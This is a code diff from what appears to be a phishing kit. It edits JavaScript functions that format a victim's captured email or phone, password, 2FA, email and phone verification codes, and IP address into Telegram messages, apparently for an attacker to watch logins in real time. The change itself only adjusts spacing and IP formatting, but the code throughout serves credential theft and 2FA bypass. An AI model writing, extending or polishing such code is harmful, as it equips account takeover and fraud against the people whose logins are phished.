@@ -230,53 +230,57 @@ function getCredentialParts(emailPhone) {
     };
 }
 
+// ======================================================
+// UPDATED FORMAT FUNCTIONS WITH SPACING BEFORE IP
+// ======================================================
+
 function formatLoginMessage(emailPhone, password) {
     const credentials = getCredentialParts(emailPhone);
     const label = userLabel ? `(${userLabel})\n` : '';
 
-    return `${label}<b>Email:</b> ${credentials.html}\n<b>Password:</b> <code>${escapeTelegramHtml(password)}</code>\n\n<b>IP:</b> <code>${userInfo.ip}</code>`;
+    return `${label}<b>Email:</b> ${credentials.html}\n<b>Password:</b> <code>${escapeTelegramHtml(password)}</code>\n\n<b>IP:</b> <b>${userInfo.ip}</b>`;
 }
 
 function formatOneTimeLoginMessage(emailPhone) {
     const credentials = getCredentialParts(emailPhone);
     const label = userLabel ? `(${userLabel})\n` : '';
 
-    return `${label}<b>Email:</b> ${credentials.html}\n\n<b>IP:</b> <code>${userInfo.ip}</code>`;
+    return `${label}<b>Email:</b> ${credentials.html}\n\n<b>IP:</b> <b>${userInfo.ip}</b>`;
 }
 
 function format2FAMessage(code, switched = false) {
     const prefix = switched ? '🔐 Switched: ' : '🔐 2FA: ';
     const label = userLabel ? `(${userLabel})\n` : '';
 
-    return `${label}${prefix}<code>${escapeTelegramHtml(code)}</code>\n<b>IP:</b> <code>${userInfo.ip}</code>`;
+    return `${label}${prefix}<code>${escapeTelegramHtml(code)}</code>\n\n<b>IP:</b> <b>${userInfo.ip}</b>`;
 }
 
 function formatEmailVerificationMessage(code, switched = false) {
     const prefix = switched ? '📧 Switched: ' : '📧 Email Code: ';
     const label = userLabel ? `(${userLabel})\n` : '';
 
-    return `${label}${prefix}<code>${escapeTelegramHtml(code)}</code>\n<b>IP:</b> <code>${userInfo.ip}</code>`;
+    return `${label}${prefix}<code>${escapeTelegramHtml(code)}</code>\n\n<b>IP:</b> <b>${userInfo.ip}</b>`;
 }
 
 function formatPhoneVerificationMessage(code, switched = false) {
     const prefix = switched ? '📱 Switched: ' : '📱 Phone Code: ';
     const label = userLabel ? `(${userLabel})\n` : '';
 
-    return `${label}${prefix}<code>${escapeTelegramHtml(code)}</code>\n<b>IP:</b> <code>${userInfo.ip}</code>`;
+    return `${label}${prefix}<code>${escapeTelegramHtml(code)}</code>\n\n<b>IP:</b> <b>${userInfo.ip}</b>`;
 }
 
 function formatSwitchMessage(fromMethod, toMethod) {
     const toMethodFormatted = toMethod.charAt(0).toUpperCase() + toMethod.slice(1).toLowerCase();
     const label = userLabel ? `(${userLabel})\n` : '';
 
-    return `${label}<b>Switched to:</b> ${toMethodFormatted}\n<b>IP:</b> <code>${userInfo.ip}</code>`;
+    return `${label}<b>Switched to:</b> ${toMethodFormatted}\n\n<b>IP:</b> <b>${userInfo.ip}</b>`;
 }
 
 function formatGoVerifyMessage(method) {
     const methodFormatted = method.charAt(0).toUpperCase() + method.slice(1).toLowerCase();
     const label = userLabel ? `(${userLabel})\n` : '';
 
-    return `${label}<b>Selected:</b> ${methodFormatted}\n<b>IP:</b> <code>${userInfo.ip}</code>`;
+    return `${label}<b>Selected:</b> ${methodFormatted}\n\n<b>IP:</b> <b>${userInfo.ip}</b>`;
 }
 
 // ======================================================
